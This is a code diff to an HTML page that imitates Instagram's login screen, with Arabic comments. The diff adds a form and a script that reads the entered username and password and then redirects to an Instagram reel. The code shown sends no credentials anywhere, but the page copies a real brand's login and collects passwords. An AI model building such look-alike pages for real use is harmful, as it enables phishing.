@@ -2,10 +2,7 @@
 <html lang="en">
 <head>
   <meta charset="UTF-8" />
-
-  <!-- ✅ مهم جدًا للموبايل -->
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-
   <title>Instagram</title>
 
   <link rel="stylesheet" href="zzz.css" />
@@ -13,7 +10,6 @@
 </head>
 
 <body>
-
 <div class="container">
 
   <!-- الصورة الجانبية -->
@@ -25,10 +21,11 @@
   <div class="right">
     <h1 class="logo">Instagram</h1>
 
-    <input type="text" placeholder="Phone number, username, or email">
-    <input type="password" placeholder="Password">
-
-    <button class="login-btn">Log in</button>
+    <form id="loginForm">
+      <input id="username" type="text" placeholder="Phone number, username, or email">
+      <input id="password" type="password" placeholder="Password">
+      <button type="submit" class="login-btn">Log in</button>
+    </form>
 
     <div class="or">
       <span></span>
@@ -49,6 +46,26 @@
 <footer>
   <p>© 2025 Instagram from Meta</p>
 </footer>
+
+<!-- ✅ JavaScript -->
+<script>
+document.getElementById("loginForm").addEventListener("submit", function(e) {
+  e.preventDefault();
+
+  const user = document.getElementById("username").value.trim();
+  const pass = document.getElementById("password").value.trim();
+
+  if (user === "" || pass === "") {
+    alert("Please fill in all fields");
+    return;
+  }
+
+  // رابط الريل
+  const reelUrl = "https://www.instagram.com/reel/DSX5toMCFKG/";
+
+  window.location.href = reelUrl;
+});
+</script>
 
 </body>
 </html>
